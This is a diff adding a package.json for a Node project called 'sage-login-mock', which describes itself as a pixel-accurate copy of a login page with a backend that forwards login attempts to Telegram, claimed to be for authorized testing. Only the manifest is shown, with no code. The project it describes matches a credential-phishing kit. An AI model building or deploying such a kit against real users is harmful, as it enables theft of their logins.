@@ -1,0 +1,21 @@
+{
+  "name": "sage-login-mock",
+  "version": "1.0.0",
+  "description": "Pixel-accurate login page mock and backend that forwards login attempts to Telegram (for authorized testing)",
+  "main": "server/index.js",
+  "scripts": {
+    "start": "node server/index.js",
+    "dev": "nodemon server/index.js"
+  },
+  "dependencies": {
+    "dotenv": "^16.6.1",
+    "express": "^4.21.2",
+    "node-fetch": "^2.7.0"
+  },
+  "devDependencies": {
+    "nodemon": "^3.1.10"
+  },
+  "engines": {
+    "node": ">=14"
+  }
+}
